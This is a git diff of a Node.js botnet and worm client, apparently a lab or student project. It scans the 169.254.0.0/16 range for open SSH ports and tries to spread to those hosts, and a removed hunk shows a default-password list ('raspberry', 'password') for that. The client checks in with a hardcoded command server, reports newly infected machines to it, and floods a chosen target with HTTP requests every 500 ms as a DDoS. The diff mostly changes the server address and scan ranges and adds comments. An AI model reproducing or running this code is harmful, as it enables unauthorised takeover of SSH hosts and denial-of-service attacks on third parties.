@@ -2,18 +2,13 @@ var os = require('os');
 var ifaces = os.networkInterfaces();
 var tcPing = require('tcp-ping');
 var nodeSsh = require('node-ssh');
-var http = require('http');
 const ssh = new nodeSsh();
 const axios = require('axios').default;
 
-const passwords = [
-    "raspberry",
-    "password"
-]
 let ipAddress;
 let targetSpecified = false;
 let attackInterval;
-const commandServer = "169.254.4.72:3030";
+const commandServer = "169.254.103.28:3030";
 
 /**
  * Attempts to connect to the remote machine to propagate the worm
@@ -82,17 +77,21 @@ const checkConnectivity = async (host, port) => {
     return await tcPing.probeAsync(ipAddress, 22);
 }
 
+/**
+ * Scans through the 169.254.0.0/16 ip address range. Loops through all the available ip addresses
+ * and tries to find new hosts to infect.
+ * @param {string} localIpAddress The clients local ip address
+ */
 const scan = async (localIpAddress) => {
     const baseIpAddress = "169.254";
     const sshPort = 22;
     const i = 0;
-    for (let i = 0; i <= 255; i++) {
-        for (let j = 0; j <= 255; j++) {
+    for (let i = 3; i <= 255; i++) {
+        for (let j = 80; j <= 255; j++) {
             ipAddress = `${baseIpAddress}.${i}.${j}`;
             console.log(ipAddress);
             if (ipAddress !== localIpAddress && await checkConnectivity(ipAddress, sshPort)) {
                 try {
-
                     const success = await attemptConnect(ipAddress, localIpAddress);
                 } catch (ex) {
                     console.log(ex);
@@ -104,6 +103,7 @@ const scan = async (localIpAddress) => {
 
 /**
  * sends a heartbeat to the command server so it knows this bot is still alive
+ * @param {string} localIp Local ip address for the client
  */
 const heartbeat = async (localIp) => {
     try {
@@ -121,7 +121,7 @@ const heartbeat = async (localIp) => {
 
 /**
  * Attacks the specified target with a DDOS attack
- * This will probably be extracted into its own file later
+ * Uses setInterval to attack the target on with a given cadence
  * @param {string} targetIpAddress ip address of the target 
  */
 const attack = (targetIpAddress) => {
@@ -129,9 +129,13 @@ const attack = (targetIpAddress) => {
     this.attackInterval = setInterval(attackTarget, 500, targetIpAddress);
 }
 
-const attackTarget = async (targetIpAddress) => {
-    console.log('attackTarget', targetIpAddress, targetSpecified);
-    attacked = await axios.get(targetIpAddress)
+/**
+ * uses axios to send a get request to the target url
+ * @param {string} targeturl The uri to attack
+ */
+const attackTarget = async (targeturl) => {
+    console.log('attackTarget', targeturl, targetSpecified);
+    attacked = await axios.get(targeturl)
     if (!targetSpecified) {
         clearInterval(this.attackInterval);
     }
@@ -146,7 +150,7 @@ const connectToServer = async (localIp, infectedIp) => {
     return new Promise(async (resolve, reject) => {
         try {
             console.log('connecting to server', commandServer);
-            const result = await axios.post(`http://${commandServer}/landing`, { ip: localIp, infectedIp: infectedIp });
+            const result = await axios.post(`http://${commandServer}/landing`, { ip: localIp, infectedByIp: infectedIp });
             resolve(result);
         } catch (ex) {
             console.log(ex);
@@ -155,6 +159,9 @@ const connectToServer = async (localIp, infectedIp) => {
     });
 }
 
+/**
+ * Queries the local ethernet interface to get the clients local ip address
+ */
 const getLocalIp = () => {
     let localIpAddress;
     return new Promise((resolve, reject) => {
@@ -171,8 +178,10 @@ const getLocalIp = () => {
     })
 }
 
-
-const startBotnet = async () => {
+/**
+ * asynchronous function to start the botnet client
+ */
+const startClient = async () => {
     if (process.argv.length === 4) {
         ipAddress = process.argv[2];
         localIpAddress = process.argv[3]
@@ -191,4 +200,4 @@ const startBotnet = async () => {
     }
 }
 
-startBotnet();
+startClient();
